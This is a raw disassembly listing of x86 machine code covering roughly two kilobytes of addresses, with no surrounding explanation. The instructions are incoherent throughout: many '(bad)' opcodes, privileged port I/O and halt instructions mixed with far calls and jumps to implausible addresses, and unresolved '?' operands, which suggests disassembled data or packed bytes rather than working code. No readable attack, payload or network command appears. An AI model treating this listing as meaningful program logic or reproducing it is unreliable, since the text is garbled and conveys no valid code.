  4217a7:	dec    ebp
  4217a8:	xchg   BYTE PTR [ecx-0x3b1f64dc],ch
  4217ae:	or     al,0xa0
  4217b0:	xor    bh,BYTE PTR [eax-0x5b]
  4217b3:	jne    0x421804
  4217b5:	pop    ds
  4217b6:	or     al,BYTE PTR [ebx+0x6d]
  4217b9:	xor    al,0xa0
  4217bb:	loope  0x4217b0
  4217bd:	lock xor eax,0xf5fe6914
  4217c3:	ret    0x274c
  4217c6:	(bad)  
  4217c7:	in     eax,dx
  4217c8:	dec    ebp
  4217c9:	mov    bl,0x7d
  4217cb:	rol    DWORD PTR [esi],cl
  4217cd:	sub    al,0xe6
  4217cf:	(bad)  
  4217d0:	arpl   bp,bp
  4217d2:	(bad)  
  4217d3:	mov    ds:0x49bc9fe2,eax
  4217d8:	push   ds
  4217d9:	push   ds
  4217da:	mov    cl,0x11
  4217dc:	call   0xb2ecb6f6
  4217e1:	bound  esi,QWORD PTR gs:[edx-0x3f]
  4217e5:	lds    ebp,FWORD PTR [ecx]
  4217e7:	sub    BYTE PTR [eax+0x39],dh
  4217ea:	hlt    
  4217eb:	fwait
  4217ec:	repnz adc BYTE PTR [ecx+0x5f],al
  4217f0:	add    dl,BYTE PTR [ecx]
  4217f2:	mov    esp,0xd4d5c624
  4217f7:	xor    DWORD PTR [edi],ebx
  4217f9:	punpcklwd mm4,DWORD PTR [eax]
  4217fc:	cmp    BYTE PTR [ecx],al
  4217fe:	sti    
  4217ff:	jl     0x4217a2
  421801:	mov    eax,ds:0x9321d453
  421806:	imul   esi,DWORD PTR [edi-0x7e],0x9107577
  42180d:	test   DWORD PTR [edi+0x2e],edi
  421810:	loop   0x421874
  421812:	inc    esi
  421813:	jb     0x4217ae
  421815:	rol    ebp,0x8
  421818:	std    
  421819:	scas   eax,DWORD PTR es:[edi]
  42181a:	adc    esp,esi
  42181c:	je     0x4217ee
  42181e:	and    bl,BYTE PTR [edi]
  421820:	push   eax
  421821:	xor    eax,0x951fef91
  421826:	push   0xffffffca
  421828:	xchg   ebx,eax
  421829:	enter  0xe6c2,0x9f
  42182d:	pop    ss
  42182e:	mov    esp,0xb59b86aa
  421833:	add    eax,0xd974b414
  421838:	jns    0x42186e
  42183a:	scas   eax,DWORD PTR es:[edi]
  42183b:	jae    0x421871
  42183d:	jge    0x4217d8
  42183f:	jnp    0x421829
  421841:	test   esi,esp
  421843:	fild   DWORD PTR [edi+0x2c66cd62]
  421849:	inc    eax
  42184a:	and    DWORD PTR [ecx],ebp
  42184c:	mov    al,ds:0xd6ccd15d
  421851:	fwait
  421852:	(bad)  
  421853:	fst    DWORD PTR [edx-0x2c]
  421856:	aam    0xda
  421858:	(bad)  
  421859:	out    dx,eax
  42185a:	mov    ebx,0x1eabc5b8
  42185f:	inc    edi
  421860:	ins    BYTE PTR es:[edi],dx
  421861:	push   ebx
  421862:	enter  0x3214,0xee
  421866:	mov    ebx,0xed2427d7
  42186b:	sti    
  42186c:	(bad)  
  42186d:	ja     0x4218e9
  42186f:	imul   ebp,eax,0xe454cbc5
  421875:	retf   
  421876:	mov    al,ds:0xebbd7466
  42187b:	mov    eax,0xfef2890c
  421880:	mov    dl,0x55
  421882:	jp     0x421866
  421884:	std    
  421885:	xor    ch,ah
  421887:	sub    edi,DWORD PTR [edx+ecx*2]
  42188a:	lahf   
  42188b:	lea    ecx,[esi+0x59e6a002]
  421891:	neg    DWORD PTR [edx]
  421893:	ins    DWORD PTR es:[edi],dx
  421894:	in     al,dx
  421895:	jg     0x421836
  421897:	pop    edx
  421898:	pop    ss
  421899:	pop    edx
  42189a:	hlt    
  42189b:	mov    ebx,0x3afd86ef
  4218a0:	test   eax,0xaf6378dc
  4218a5:	das    
  4218a6:	mov    esp,ebx
  4218a8:	cld    
  4218a9:	aad    0xe8
  4218ab:	sti    
  4218ac:	inc    edx
  4218ad:	fild   WORD PTR [edi+0x54b656e7]
  4218b3:	mov    edx,DWORD PTR [ebx+eax*1+0x7e340ea7]
  4218ba:	loopne 0x4218d4
  4218bc:	and    eax,0xe50b6290
  4218c1:	inc    edx
  4218c2:	in     eax,0xea
  4218c4:	inc    ecx
  4218c5:	hlt    
  4218c6:	(bad)  
  4218c7:	bound  ecx,QWORD PTR [ebx]
  4218c9:	xchg   DWORD PTR [ecx],edx
  4218cb:	mov    esi,0xa469460d
  4218d0:	ror    BYTE PTR [edx-0x276bd705],0xe5
  4218d7:	sub    eax,0x9d427ed1
  4218dc:	or     DWORD PTR [ecx-0x1c8cb22b],0xd44ea246
  4218e6:	jl     0x421906
  4218e8:	in     eax,dx
  4218e9:	dec    esp
  4218ea:	push   edi
  4218eb:	adc    eax,0x63454e09
  4218f0:	lahf   
  4218f1:	xlat   BYTE PTR ds:[ebx]
  4218f2:	pop    ebx
  4218f3:	mov    eax,0xd553b487
  4218f8:	jecxz  0x421884
  4218fa:	mov    al,0x25
  4218fc:	je     0x421933
  4218fe:	xchg   esp,eax
  4218ff:	scas   al,BYTE PTR es:[edi]
  421900:	shl    BYTE PTR [eax],cl
  421902:	mov    ds:0x5c196def,eax
  421907:	cmp    DWORD PTR [eax-0x75190cb],ebx
  42190d:	xchg   edx,eax
	...
  42191a:	mov    al,0x33
  42191c:	cmp    ch,BYTE PTR [ecx+0x3bb3a9bb]
  421922:	pop    DWORD PTR [edx-0x44]
  421925:	mov    dl,BYTE PTR [edi+0x39]
  421928:	xor    al,0x95
  42192a:	in     al,0x94
  42192c:	add    DWORD PTR [eax],eax
  42192e:	cld    
  42192f:	add    DWORD PTR [eax],eax
  421931:	add    BYTE PTR [esi+0x1d],dl
  421934:	ja     0x4218bb
  421936:	ret    
  421937:	popa   
  421938:	jl     0x4218fe
  42193a:	pop    ebp
  42193b:	jmp    FWORD PTR [ebx+eax*4-0x75]
  42193f:	sub    eax,DWORD PTR [edx+0x4ef56e01]
  421945:	jecxz  0x42192a
  421947:	out    dx,eax
  421948:	add    BYTE PTR [edi-0x3b],dl
  42194b:	xchg   edi,eax
  42194c:	gs or  eax,0xd1c6cd7b
  421952:	cdq    
  421953:	stos   DWORD PTR es:[edi],eax
  421954:	sub    DWORD PTR [ecx+0x4],0xffffff85
  421958:	jg     0x4219c4
  42195a:	pop    edi
  42195b:	pop    edi
  42195c:	inc    ebp
  42195d:	push   ecx
  42195e:	mov    dh,BYTE PTR [ebp+0x13eaaae7]
  421964:	dec    ebp
  421965:	mov    ecx,0xd58ea39b
  42196a:	and    dl,BYTE PTR [eax]
  42196c:	adc    ecx,DWORD PTR [ebx-0x31d4d5f0]
  421972:	movzx  esi,BYTE PTR [esi+0x60]
  421976:	stc    
  421977:	pop    eax
  421978:	cmp    DWORD PTR [ebx+0x33ba1bf1],esp
  42197e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42197f:	and    DWORD PTR [edi+ecx*2-0x56505fc1],esi
  421986:	out    0xdf,al
  421988:	or     BYTE PTR [ecx],bl
  42198a:	cs xchg esi,eax
  42198c:	mov    esp,0xbddbc70f
  421991:	loope  0x421968
  421993:	adc    al,0xb3
  421995:	adc    ah,0x9b
  421998:	ins    BYTE PTR es:[edi],dx
  421999:	out    dx,eax
  42199a:	push   ss
  42199b:	mov    bh,0x3a
  42199d:	inc    ecx
  42199e:	mov    ds:0x81cf887f,al
  4219a3:	mov    ds,WORD PTR [esi]
  4219a5:	push   edx
  4219a6:	push   DWORD PTR [edx+0x35]
  4219a9:	pusha  
  4219aa:	ret    
  4219ab:	js     0x421932
  4219ad:	push   eax
  4219ae:	and    DWORD PTR [esi+0x26d34803],ebx
  4219b4:	(bad)  
  4219b5:	fisttp WORD PTR [ecx-0x63]
  4219b8:	push   0x43002b4d
  4219bd:	sub    ebp,DWORD PTR [edx]
  4219bf:	adc    ebp,DWORD PTR [eax]
  4219c1:	in     eax,0xde
  4219c3:	les    esp,FWORD PTR [ebp+0x4805a28a]
  4219c9:	mov    DWORD PTR ds:0x209a1e12,0xf1a0d969
  4219d3:	outs   dx,DWORD PTR ds:[esi]
  4219d4:	ret    
  4219d5:	or     eax,0xc6150eb0
  4219da:	imul   esp,edx,0x8c709a6e
  4219e0:	sub    BYTE PTR [ebx+eax*8-0x45dfb177],0xb5
  4219e8:	cmp    ebp,DWORD PTR [esi-0x14]
  4219eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219ec:	inc    esp
  4219ed:	ja     0x4219e6
  4219ef:	repnz popa 
  4219f1:	pop    esp
  4219f2:	cwde   
  4219f3:	test   eax,0x87f588fc
  4219f8:	mov    esi,0x62c22103
  4219fd:	call   0xa24c:0xa19a5ebf
  421a04:	dec    edx
  421a05:	mov    bl,0x89
  421a07:	mov    ecx,0x60e40328
  421a0c:	adc    al,0x57
  421a0e:	js     0x421a67
  421a10:	lds    ebx,FWORD PTR [edx]
  421a12:	imul   edi,DWORD PTR [esi],0xffffffef
  421a15:	xchg   edi,eax
  421a17:	xor    eax,0xc4c7c369
  421a1c:	rol    BYTE PTR [eax+eax*2+0x33565f02],cl
  421a23:	enter  0x6ea1,0xf4
  421a27:	mov    dh,0xae
  421a29:	xlat   BYTE PTR ds:[ebx]
  421a2a:	mov    al,0x3d
  421a2c:	fcom   st(4)
  421a2e:	call   FWORD PTR [ecx]
  421a30:	add    ah,bl
  421a32:	sar    dh,cl
  421a34:	jo     0x421a8d
  421a36:	retf   0x28f9
  421a39:	lods   eax,DWORD PTR ds:[esi]
  421a3a:	push   eax
  421a3b:	rcr    BYTE PTR [ebx+0x53],0x11
  421a3f:	sar    BYTE PTR [ecx-0x22bf0d03],cl
  421a45:	xchg   esp,eax
  421a46:	xchg   ecx,eax
  421a47:	pop    edi
  421a48:	ss dec ebp
  421a4a:	mov    edx,0x3faacbf9
  421a4f:	or     BYTE PTR [eax],cl
  421a51:	icebp  
  421a52:	xor    esi,DWORD PTR [edx+0x69]
  421a55:	test   al,0xf0
  421a57:	fwait
  421a58:	xor    DWORD PTR [edx+0x9],ebx
  421a5b:	pusha  
  421a5c:	test   DWORD PTR [ecx],0xa2276b3e
  421a62:	push   cs
  421a63:	ins    BYTE PTR es:[edi],dx
  421a64:	nop
  421a65:	adc    ebx,DWORD PTR [esi+0x7eda6b9f]
  421a6b:	add    eax,ebx
  421a6d:	mov    es,WORD PTR [ecx-0x30393e1e]
  421a73:	shr    esp,1
  421a75:	lods   eax,DWORD PTR ds:[esi]
  421a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a77:	push   ecx
  421a78:	mov    edx,DWORD PTR [edx-0x73dda53d]
  421a7e:	pop    es
  421a7f:	imul   eax,DWORD PTR [esp+edx*8],0x21
  421a83:	mov    eax,ds:0xaabfc220
  421a88:	iret   
  421a89:	xchg   BYTE PTR [eax+0xd],bl
  421a8c:	sbb    al,0xed
  421a8e:	dec    BYTE PTR [edi-0x656fecc2]
  421a94:	and    edi,ecx
  421a96:	mov    DWORD PTR [ebx+esi*1],ecx
  421a99:	fst    DWORD PTR ds:0x7d0b127f
  421a9f:	outs   dx,DWORD PTR ds:[esi]
  421aa0:	push   eax
  421aa1:	mov    cl,0x20
  421aa3:	stos   DWORD PTR es:[edi],eax
  421aa4:	pusha  
  421aa5:	sbb    esp,DWORD PTR cs:[ebp+0x4a5fff23]
  421aac:	call   0x987317d4
  421ab1:	or     eax,0xf2cae2a8
  421ab6:	or     DWORD PTR [edx+0x49],esp
  421ab9:	mov    ch,0x36
  421abb:	out    dx,eax
  421abc:	and    BYTE PTR [ebx-0x46fc28b8],bl
  421ac2:	and    edi,DWORD PTR [ebx]
  421ac4:	int3   
  421ac5:	not    DWORD PTR [ebx+esi*8+0x3a]
  421ac9:	arpl   WORD PTR [ebp-0x4e],cx
  421acc:	add    al,0x8e
  421ace:	gs xchg esi,ebp
  421ad1:	lods   eax,DWORD PTR ds:[esi]
  421ad2:	fcomp  DWORD PTR [eax+0x61020bf5]
  421ad8:	push   edx
  421ad9:	adc    BYTE PTR [eax],ah
  421adb:	xchg   ecx,eax
  421adc:	mov    cl,0x46
  421ade:	xor    al,BYTE PTR [ebx+0x3636310f]
  421ae4:	mov    ebx,?
  421ae6:	push   esp
  421ae7:	out    dx,eax
  421ae8:	cmp    ah,BYTE PTR [eax+0x5dd62007]
  421aee:	mov    BYTE PTR [edi+0x12],al
  421af1:	sbb    DWORD PTR [ebx-0x33],ecx
  421af4:	call   DWORD PTR [edi]
  421af6:	xchg   esi,eax
  421af7:	pop    es
  421af8:	inc    esp
  421af9:	xor    eax,0x9294ed84
  421afe:	jmp    0xdf03c016
  421b03:	sti    
  421b04:	outs   dx,DWORD PTR ds:[esi]
  421b05:	mov    WORD PTR [ecx],gs
  421b07:	mov    cx,0xfc21
  421b0b:	loopne 0x421adb
  421b0d:	(bad)  
  421b0e:	les    edx,FWORD PTR [edx+0x24d53a40]
  421b14:	out    0x1f,eax
  421b16:	cmp    DWORD PTR [ebp-0x4b],edx
  421b19:	or     al,0xc0
  421b1b:	push   esp
  421b1c:	clc    
  421b1d:	adc    eax,0x1eee7e0d
  421b22:	idiv   esp
  421b24:	adc    al,dl
  421b26:	xlat   BYTE PTR ds:[ebx]
  421b27:	jb     0x421b75
  421b29:	pop    eax
  421b2a:	add    ebp,DWORD PTR [ebp+0x7430]
	...
  421b38:	add    BYTE PTR [eax],al
  421b3a:	test   eax,0xff94c95e
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0xd763f8f7
  421b48:	dec    esi
  421b49:	inc    ecx
  421b4a:	loopne 0x421ae2
  421b4c:	add    DWORD PTR [eax],eax
  421b4e:	cld    
  421b4f:	add    DWORD PTR [eax],eax
  421b51:	add    bh,dh
  421b53:	xchg   DWORD PTR [ecx+0x2dc6a058],edx
  421b59:	les    ebp,FWORD PTR ds:0x441b5cc9
  421b5f:	mov    bh,cl
  421b61:	mov    esi,edx
  421b63:	dec    edx
  421b64:	fdivr  st(1),st
  421b66:	or     ecx,eax
  421b68:	jg     0x421afe
  421b6a:	push   0x8
  421b6c:	ret    
  421b6d:	aad    0xeb
  421b6f:	or     eax,0x6b28d224
  421b74:	imul   esi,ebx,0xffffffbf
  421b77:	mov    esp,0x603a536e
  421b7c:	das    
  421b7d:	xchg   ecx,eax
  421b7e:	add    BYTE PTR [edi],bl
  421b80:	add    al,0xb9
  421b82:	jno    0x421b3f
  421b84:	sbb    esi,edx
  421b86:	jle    0x421bf5
  421b88:	mul    BYTE PTR [ebx-0x79]
  421b8b:	adc    ebp,esi
  421b8d:	in     eax,dx
  421b8e:	sar    BYTE PTR [edi*4+0x2386874c],1
  421b95:	jmp    0x53aa6a21
  421b9a:	aam    0xfa
  421b9c:	mov    al,0x87
  421b9e:	test   al,0x3a
  421ba0:	inc    ecx
  421ba1:	mov    al,0xd9
  421ba3:	retf   0x475f
  421ba6:	inc    esp
  421ba7:	shl    BYTE PTR [edx+esi*2-0x71],1
  421bab:	mov    ebx,ebp
  421bad:	(bad)  
  421bae:	test   esi,0x378cc678
  421bb4:	pop    ss
  421bb5:	sub    dh,ah
  421bb7:	arpl   bx,sp
  421bb9:	inc    esp
  421bba:	lock and al,0x93
  421bbd:	pop    esi
  421bbe:	icebp  
  421bbf:	inc    ebx
  421bc0:	das    
  421bc1:	leave  
  421bc2:	fcomip st,st(5)
  421bc4:	inc    ecx
  421bc5:	or     eax,0xf3c6decb
  421bca:	or     esi,DWORD PTR [edi+0x16fe34b2]
  421bd0:	aad    0x8a
  421bd2:	sbb    ebx,edi
  421bd4:	adc    esi,DWORD PTR [edi]
  421bd6:	jmp    0x3bedeeda
  421bdb:	cmp    DWORD PTR [ebx+0x44],0xffffffbe
  421bdf:	adc    DWORD PTR [ebx+0xd621b31],edi
  421be5:	sti    
  421be6:	(bad)
  421bea:	loope  0x421b9d
  421bec:	cmp    esp,ebp
  421bee:	pop    ss
  421bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bf0:	(bad)  
  421bf1:	aaa    
  421bf2:	cmp    esi,DWORD PTR ss:[eax+0x12]
  421bf6:	push   ebx
  421bf7:	dec    ebx
  421bf8:	mov    BYTE PTR [ecx+0xb838c85],bl
  421bfe:	lods   eax,DWORD PTR ds:[esi]
  421bff:	mov    bh,0x34
  421c01:	sub    esi,DWORD PTR [edi-0xd885f14]
  421c07:	adc    edi,0xa2a358da
  421c0d:	je     0x421c0a
  421c0f:	jle    0x421c43
  421c11:	in     eax,0xa4
  421c13:	retf   0xdb4c
  421c16:	and    ebp,ebp
  421c18:	imul   eax,edx,0x5c4c2c99
  421c1e:	not    DWORD PTR [eax+0x3af96032]
  421c24:	dec    edx
  421c25:	pop    esp
  421c26:	repz sahf 
  421c28:	adc    ecx,DWORD PTR [ebx-0x5b55d564]
  421c2e:	fbld   TBYTE PTR ds:0x4b82a111
  421c34:	ins    BYTE PTR es:[edi],dx
  421c35:	(bad)  
  421c36:	outs   dx,DWORD PTR ds:[esi]
  421c37:	or     al,0x76
  421c39:	mov    cl,0xa9
  421c3b:	inc    edx
  421c3c:	and    al,0x20
  421c3e:	pushf  
  421c3f:	or     eax,0xacb8a2af
  421c44:	in     eax,dx
  421c45:	daa    
  421c46:	sbb    cl,cl
  421c48:	mov    eax,0xd3289cb9
  421c4d:	int3   
  421c4e:	call   0xb446:0x2be8c462
  421c55:	mov    ebp,0x33a802d6
  421c5a:	dec    edi
  421c5b:	push   es
  421c5c:	mov    ch,0x76
  421c5e:	test   BYTE PTR [ecx-0x32],cl
  421c61:	push   edx
  421c62:	mov    al,0xae
  421c64:	ficomp WORD PTR [esi+0x25]
  421c67:	push   0xdf778d49
  421c6c:	add    edx,DWORD PTR [ecx-0x17]
  421c6f:	icebp  
  421c70:	jle    0x421c08
  421c72:	int3   
  421c73:	pushf  
  421c74:	es mov edi,0xbb897547
  421c7a:	cmc    
  421c7b:	ss push es
  421c7d:	loopne 0x421c74
  421c7f:	out    dx,al
  421c80:	push   edx
  421c81:	or     cl,dh
  421c83:	mov    BYTE PTR ds:0x9ba43c62,ch
  421c89:	add    dl,bh
  421c8b:	mov    al,ch
  421c8d:	scas   eax,DWORD PTR es:[edi]
  421c8e:	mov    al,ds:0x371074f6
  421c93:	jl     0x421d0a
  421c95:	dec    eax
  421c96:	mov    bh,0x29
  421c98:	cdq    
  421c99:	jae    0x421c5c
  421c9b:	dec    ecx
  421c9c:	popf   
  421c9d:	test   BYTE PTR [ecx+ebx*2-0x5c],al
  421ca1:	inc    edi
  421ca2:	push   ds
  421ca3:	add    eax,0x2f4f0711
  421ca8:	es dec esp
  421caa:	shl    BYTE PTR [edx-0x28],1
  421cad:	or     eax,0x78a779fa
  421cb2:	clc    
  421cb3:	les    ebx,FWORD PTR [eax-0x4e539e7b]
  421cb9:	stc    
  421cba:	(bad)  
  421cbb:	ja     0x421c54
  421cbd:	fdivr  DWORD PTR [esi+0xb]
  421cc0:	jbe    0x421c86
  421cc2:	loope  0x421c8e
  421cc4:	or     eax,esi
  421cc6:	adc    DWORD PTR [edx+0x37],edi
  421cc9:	shl    BYTE PTR [edx+0x205dbd8],0xf5
  421cd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cd1:	std    
  421cd2:	and    al,0xe0
  421cd4:	xchg   edx,edx
  421cd6:	sub    eax,0x4f0656be
  421cdb:	or     dl,ah
  421cdd:	mov    al,0xcd
  421cdf:	loopne 0x421d1c
  421ce1:	lea    eax,[edx+0x50049e49]
  421ce7:	inc    DWORD PTR [ebp-0x3f]
  421cea:	adc    eax,0x5f9c4aad
  421cef:	and    BYTE PTR gs:[ecx],cl
  421cf2:	dec    esi
  421cf3:	mov    ch,0xdd
  421cf5:	lea    esp,[bx+si]
  421cf8:	jg     0x421c95
  421cfa:	std    
  421cfb:	dec    ecx
  421cfc:	sahf   
  421cfd:	pop    edi
  421cfe:	mov    edi,0xa5476e25
  421d03:	xchg   esi,eax
  421d04:	push   esi
  421d05:	out    0x18,eax
  421d07:	xor    al,0xd1
  421d09:	mov    cl,BYTE PTR [ebp+0x12]
  421d0c:	in     al,dx
  421d0d:	ins    DWORD PTR es:[edi],dx
  421d0e:	pop    edx
  421d0f:	mov    ebx,0x115d4098
  421d14:	fwait
  421d15:	ds stos DWORD PTR es:[edi],eax
  421d17:	rcr    dh,0xb1
  421d1a:	adc    eax,0x34f97f33
  421d1f:	adc    BYTE PTR [ebx-0x6d959b4c],dl
  421d25:	pxor   mm6,QWORD PTR [ecx-0x6a]
  421d29:	mov    ds:0xf2135ab3,eax
  421d2e:	pop    es
  421d2f:	xchg   edi,eax
  421d30:	xlat   BYTE PTR ds:[ebx]
  421d31:	pushf  
  421d32:	sbb    eax,0x16331fa1
  421d37:	dec    esp
  421d38:	bound  edi,QWORD PTR [esi]
  421d3a:	mov    edx,0x5dd52829
  421d3f:	adc    BYTE PTR [edi-0x45],cl
  421d42:	ins    BYTE PTR es:[edi],dx
  421d43:	push   esi
  421d44:	adc    eax,0x30afb67e
  421d49:	iret   
  421d4a:	sub    esi,DWORD PTR [esi+0x5b]
  421d4d:	inc    ebx
	...
  421d5a:	mov    ebx,0x7d7539cf
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	das    
  421d67:	xor    al,0x4b
  421d69:	or     ah,bl
  421d6b:	cwde   
  421d6c:	add    DWORD PTR [eax],eax
  421d6e:	cld    
  421d6f:	add    DWORD PTR [eax],eax
  421d71:	add    BYTE PTR [ebx],cl
  421d73:	retf   
  421d74:	mov    dl,0x6d
  421d76:	(bad)  
  421d77:	in     al,dx
  421d78:	mov    ds:0xd588e1a4,al
  421d7d:	jle    0x421db4
  421d7f:	adc    eax,0xc34221c6
  421d84:	gs dec ecx
  421d86:	jmp    0x9cf3:0xdb0ef935
  421d8d:	cdq    
  421d8e:	jp     0x421df3
  421d90:	shl    DWORD PTR [eax],cl
  421d92:	out    0xc9,al
  421d94:	sbb    cl,dl
  421d96:	dec    ecx
  421d97:	jmp    0x421daa
  421d99:	mov    ds:0x3b7609cf,al
  421d9e:	fistp  WORD PTR [edx+ecx*4+0x7fb2afce]
  421da5:	stc    
  421da6:	xor    ebx,eax
  421da8:	in     al,dx
  421da9:	dec    esp
  421daa:	and    ecx,0xa2f2b005
  421db0:	dec    ecx
  421db2:	jmp    0x99ef:0x291625d2
  421db9:	(bad)  
  421dba:	int3   
  421dbb:	out    0x52,eax
  421dbd:	pop    ss
  421dbe:	cld    
  421dbf:	cmp    eax,DWORD PTR [edx+eiz*1+0x1a]
  421dc3:	push   ebp
  421dc4:	jg     0x421dc7
  421dc6:	loopne 0x421d64
  421dc8:	pop    esp
  421dc9:	rol    DWORD PTR [edx],1
  421dcb:	inc    ebp
  421dcc:	push   edx
  421dcd:	and    DWORD PTR [ebx+0x59],0xd3f8ed34
  421dd4:	stos   BYTE PTR es:[edi],al
  421dd5:	shr    DWORD PTR [edx-0x188bba6],cl
  421ddb:	inc    esi
  421ddc:	push   ecx
  421ddd:	data16 outs dx,BYTE PTR ds:[esi]
  421ddf:	addr16 in eax,dx
  421de1:	(bad)  
  421de2:	dec    edi
  421de3:	enter  0xfef3,0x6
  421de7:	xchg   DWORD PTR [edx+0x77f54cf7],edi
  421ded:	mov    bh,0xa2
  421def:	adc    DWORD PTR [esi-0x7957221],edx
  421df5:	out    dx,al
  421df6:	pop    ds
  421df7:	jb     0x421e05
  421df9:	(bad)  
  421dfa:	ds aam 0x99
  421dfd:	cmp    al,al
  421dff:	les    ecx,FWORD PTR [ecx+0x5]
  421e02:	xor    BYTE PTR [ebx-0x49],bl
  421e05:	js     0x421e17
  421e07:	xchg   edx,eax
  421e08:	fnstsw WORD PTR [edx]
  421e0a:	pop    esp
  421e0b:	loopne 0x421e3a
  421e0d:	test   ax,0x7cb6
  421e11:	aam    0x78
  421e13:	lods   al,BYTE PTR ds:[esi]
  421e14:	imul   esi,DWORD PTR [ecx+eiz*1],0x84085bfb
  421e1b:	pop    edi
  421e1c:	jno    0x421df1
  421e1e:	pop    ecx
  421e1f:	test   DWORD PTR [ecx],esp
  421e21:	jmp    FWORD PTR [ebx]
  421e23:	(bad)  
  421e24:	jnp    0x421e25
  421e26:	xchg   edi,eax
  421e27:	sub    eax,DWORD PTR ds:0xb592a1e
  421e2e:	cwde   
  421e2f:	sub    BYTE PTR [ecx-0x4eb5ccd4],dh
  421e35:	pushf  
  421e36:	jnp    0x421e78
  421e38:	push   edx
  421e39:	call   0x9a39a82f
  421e3e:	(bad)  
  421e40:	xor    al,0x25
  421e42:	dec    edi
  421e43:	int3   
  421e44:	mov    edx,0xde3ee2c0
  421e49:	dec    edi
  421e4a:	push   edi
  421e4b:	stos   BYTE PTR es:[edi],al
  421e4c:	shl    DWORD PTR es:[ebx-0x77424c1e],cl
  421e53:	jl     0x421de3
  421e55:	jg     0x421e3f
  421e57:	pop    edx
  421e58:	loope  0x421dea
  421e5a:	push   edi
  421e5b:	ins    DWORD PTR es:[edi],dx
  421e5c:	xor    al,BYTE PTR [esi-0x7b]
  421e5f:	das    
  421e60:	push   ds
  421e61:	jl     0x421e97
  421e63:	xchg   ebp,eax
  421e64:	leave  
  421e65:	or     esi,DWORD PTR [edx+0x41e2f2d9]
  421e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e6c:	fmul   st,st(7)
  421e6e:	or     BYTE PTR [ebx],ah
  421e70:	fnstenv [ebx]
  421e72:	adc    ecx,esi
  421e74:	push   esi
  421e75:	cli    
  421e76:	call   0xdc49f79f
  421e7b:	pop    ecx
  421e7c:	push   esp
  421e7d:	add    eax,0x90806ca
  421e82:	fs xchg esp,eax
  421e84:	aad    0xef
  421e86:	sbb    edx,esp
  421e88:	push   edx
  421e89:	stc    
  421e8a:	cdq    
  421e8b:	fisttp DWORD PTR es:[eax+edx*4]
  421e8f:	sti    
  421e90:	subps  xmm3,XMMWORD PTR [edx-0x296d43f9]
  421e97:	sahf   
  421e98:	sahf   
  421e99:	mov    eax,0x678c4494
  421e9e:	mov    eax,0xb50c4fc
  421ea3:	xor    bh,BYTE PTR [edi]
  421ea5:	or     cl,BYTE PTR [esi]
  421ea7:	pop    edx
  421ea8:	test   dh,ah
  421eaa:	jns    0x421efa
  421eac:	mov    DWORD PTR [eax+0x4b3238f6],edx
  421eb2:	arpl   WORD PTR [edi-0x58],sp
  421eb5:	jmp    0xd4f3e3d1
  421eba:	add    al,0x26
  421ebc:	adc    DWORD PTR [ebx+0x4de78649],ebx
  421ec2:	sub    al,0x43
  421ec4:	pusha  
  421ec5:	xchg   edi,eax
  421ec6:	pop    eax
  421ec7:	mov    ?,WORD PTR [ecx-0x70de1787]
  421ecd:	(bad)  
  421ece:	mov    ds:0x3298f889,eax
  421ed3:	into   
  421ed4:	cli    
  421ed5:	outs   dx,BYTE PTR ds:[esi]
  421ed6:	pop    ds
  421ed7:	xor    eax,DWORD PTR [edi]
  421ed9:	stc    
  421eda:	push   esi
  421edb:	iret   
  421edc:	adc    bh,0xe3
  421edf:	sub    BYTE PTR [esi],cl
  421ee1:	mov    al,ds:0x2a331678
  421ee6:	pop    edx
  421ee7:	lahf   
  421ee8:	call   0xa52e:0xf2922062
  421eef:	outs   dx,DWORD PTR ds:[esi]
  421ef0:	or     ecx,edi
  421ef2:	mov    esp,0xa33ae101
  421ef7:	jge    0x421e7f
  421ef9:	lahf   
  421efa:	sub    ebx,ebx
  421efc:	fidivr DWORD PTR [ebp-0x64064b09]
  421f02:	pop    ebp
  421f03:	ror    dl,1
  421f05:	dec    edi
  421f06:	ror    dh,1
  421f08:	sar    BYTE PTR [ebx+0x69],0xb8
  421f0c:	call   0x5973b03e
  421f11:	stos   DWORD PTR es:[edi],eax
  421f12:	add    esp,DWORD PTR [eax+edx*4+0x774fe6d8]
  421f19:	fld    st(1)
  421f1b:	dec    edi
  421f1c:	mov    al,ds:0xcea22c31
  421f21:	mov    ?,WORD PTR [ecx]
  421f23:	inc    esp
  421f24:	pop    ebx
  421f25:	rol    BYTE PTR [ebx-0x10],0x99
  421f29:	dec    edx
  421f2a:	or     ebp,DWORD PTR [esi+0x29cb3a15]
  421f30:	les    esi,FWORD PTR [eax]
  421f32:	push   ebp
  421f33:	xchg   edx,eax
  421f34:	js     0x421f62
  421f36:	inc    esi
  421f37:	inc    edx
  421f38:	jle    0x421f49
  421f3a:	lahf   
  421f3b:	mov    esi,0xa26468f2
  421f40:	out    0x96,al
  421f42:	nop
  421f43:	dec    esi
  421f44:	test   al,0xef
  421f46:	push   esi
  421f47:	jbe    0x421f24
  421f49:	mov    ebp,0xd58cee60
  421f4e:	scas   eax,DWORD PTR es:[edi]
  421f4f:	sub    dh,BYTE PTR [eax-0x738c232d]
  421f55:	sbb    al,0x5b
  421f57:	lds    ecx,FWORD PTR [eax-0x17]
  421f5a:	div    DWORD PTR [edi+eiz*4-0x276aa2f2]
  421f61:	gs jmp 0x6e1:0x3c84b670
  421f69:	mov    ebp,0x75b2a505
	...
  421f7a:	out    dx,al
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     BYTE PTR [edx-0x4f],dl
  421f88:	jne    0x421f5a
  421f8a:	fcomp  DWORD PTR [edx+0x1fc0001]
  421f90:	add    BYTE PTR [eax],al
  421f92:	arpl   bx,bx
  421f94:	mov    cs,WORD PTR [ecx+0x33]
  421f97:	or     dh,al
  421f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f9a:	add    edx,DWORD PTR [ebx-0x3ec30ada]
  421fa0:	leave  
  421fa1:	loop   0x421ff0
  421fa3:	xchg   esp,eax
  421fa4:	dec    edi
